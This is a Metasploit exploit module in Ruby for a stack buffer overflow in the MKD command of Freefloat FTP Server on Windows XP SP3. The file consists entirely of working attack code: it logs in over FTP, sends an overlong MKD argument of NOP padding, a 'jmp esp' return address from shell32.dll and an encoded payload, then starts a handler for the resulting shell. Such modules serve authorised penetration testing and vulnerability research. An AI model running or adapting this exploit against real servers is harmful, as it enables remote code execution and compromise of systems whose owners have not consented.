##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Freefloat FTP Server MKD Command Stack Overflow',
			'Description'    => %q{
						This module exploits a buffer overflow vulnerability
						found in the MKD command in the Freefloat FTP server.
			},
			'Author'         => [
						'C4SS!0 G0M3S',		# Initial Discovery
						'James Fitts'	# Metasploit Module
					],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/17539/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space' => 700,
					'BadChars' => "\x00\x0a\x0d",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3', 
						{ 
							'Ret' => 0x7cb97475, # jmp esp from shell32.dll
							'Offset' => 247
						} 
					],
				],
			'DisclosureDate' => 'Jul 17 2011',
			'DefaultTarget'	=> 0))
	end

	def exploit
		connect_login

		print_status("Trying target #{target.name}...")

		buf = make_nops(target['Offset']) + [target.ret].pack('V')
		buf << make_nops(20)
		buf << payload.encoded

		send_cmd( ['MKD', buf] , false )

		handler
		disconnect
	end

end
